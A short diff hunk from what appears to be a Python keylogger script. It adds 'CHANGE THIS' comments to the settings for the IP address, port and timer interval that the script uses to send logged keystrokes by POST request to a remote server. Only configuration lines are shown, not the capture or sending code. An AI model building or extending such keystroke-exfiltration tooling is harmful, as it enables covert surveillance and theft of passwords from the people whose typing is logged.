@@ -6,11 +6,11 @@ import threading
 keylog = ""
 
 # ip address and port number we want to send post requests to
-ip_address = "127.0.0.1"
-port = "8000"
+ip_address = "127.0.0.1" #CHANGE THIS
+port = "8000" #CHANGE THIS
 
 #time interval betweeen post requests
-timer_interval = 10
+timer_interval = 10 #CHANGE THIS IF NEEDED
 
 
 #logging the key to global variable
